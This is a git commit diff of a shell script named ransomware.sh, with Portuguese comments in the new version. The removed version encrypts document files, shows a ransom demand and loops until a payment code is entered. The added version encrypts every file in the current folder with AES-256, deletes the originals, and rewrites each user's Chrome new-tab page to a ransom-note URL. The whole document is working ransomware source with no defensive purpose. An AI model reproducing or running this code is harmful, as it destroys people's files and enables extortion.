1373ac2f98a8814e6ca42de0282ba5f358e7ac6a
Mrlucas5550100 <88862782+Mrlucas5550100@users.noreply.github.com>
2023-03-14 09:48:25 -0300

    Update ransomware.sh

--- ransomware.sh
+++ ransomware.sh
@@ -1,56 +1,25 @@
 #!/bin/bash
 
-# AES-256 cryption
-openssl enc -aes-256-cbc -salt -in $1 -out encrypted.enc
+#Defina a senha do ransomware
+pass="A_PASSWORD_HERE"
 
-# Listing files in target folder
-find . -name "*.pdf" -o -name "*txt" -o -name "*doc" -o -name "*docx" > file_list.txt
-
-# Encrypting the files in folder
-cat file_list.txt | while read line; do 
-
-    openssl aes-256-cbc -salt -in "$line" -out "`echo $line | sed 's/\//-/'`"
-
-done
-
-# Creating file with the demanded ransom
-touch README.txt
-echo "All of your files have been encrypted with AES-256. To decrypt your files you must pay the required ransom." > README.txt
-
-# Display a ransom message
-zenity --info --title="ATTENTION !" --text=“All of your files have been encrypted with AES-256. To decrypt your files you must pay the required ransom.”
-
-# Deleting the unencrypted files
-rm -rf file_list.txt
-
-# Set a trap to prevent the user to close the script
-trap "exit" INT TERM
-trap "kill 0" EXIT
-
-# Run an infinite loop while asking for payment
-while true;
+#Encripta os arquivos usando AES-256-CBC 
+for file in *;
 do
-    payment_check=$(zenity --title "Ransomware" --entry --text="Enter the payment code")
-
-    if [ $payment_check = "ABC123" ]; then
-        break
-    else
-        zenity --info --title="ERROR" --text="Incorrect Payment Code!"
+    if [ "$file" == "ransomware.sh" ];
+    then 
+        continue
     fi
+    openssl enc -aes-256-cbc -salt -in "$file" -out "${file}.lock" -k $pass
+    rm -rf "$file"
 done
 
-# Decrypting files
-cat file_list.txt | while read line; do
-
-    openssl aes-256-cbc -d -in "`echo $line | sed 's/\//-/'`" -out "$line"
-    
+#Muda a página inicial do Google Chrome
+for user in $(ls /home);
+do
+    if [ "$user" == "all" ];
+    then
+        continue
+    fi
+    sed -i 's:"chrome_url_overrides": {"new_tab": "https://ransom-note.site.com/" }:" /home/$user/.config/google-chrome/Default/Preferences
 done
-
-# Removing encrypted files
-rm -rf *.enc
-
-# Removing the ransom message
-rm -rf README.txt
-
-# Freeing the trap
-trap - INT TERM EXIT
